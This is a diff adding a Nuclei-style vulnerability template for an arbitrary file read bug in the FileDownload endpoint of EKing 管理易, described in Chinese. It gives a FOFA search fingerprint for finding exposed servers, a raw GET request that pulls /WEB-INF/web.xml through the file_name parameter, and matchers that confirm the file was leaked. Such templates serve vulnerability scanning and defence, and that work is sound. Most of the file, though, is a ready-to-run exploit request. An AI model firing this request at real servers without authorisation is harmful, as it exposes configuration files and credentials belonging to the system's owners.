@@ -1,0 +1,35 @@
+id: EKing-FileDownload-File-reading
+
+info:
+  name: EKing-管理易 FileDownload 接口任意文件读取漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="EKing-管理易"
+      EKing-管理易的FileDownload接口存在任意文件读取漏洞。攻击者可绕过身份验证机制，通过构造特定请求路径访问受限文件系统资源，包括数据库连接配置、系统敏感配置文件等关键数据。该漏洞允许远程获取服务器端文件内容，可能导致完整的系统权限丧失及敏感数据泄露。
+  reference:
+  - https://mp.weixin.qq.com/s/Nf-C_kGKzTun4PMekB7tHw
+  tags: EKing-管理易
+
+
+http:
+- raw:
+  - |
+    GET /FileDownload.ihtm?file_name=/WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version='
+    - '<web-app'
+    - '</web-app>'
+    - '<context-param>'
+    - '</context-param>'
+    condition: and
+  - type: status
+    status:
+    - 200
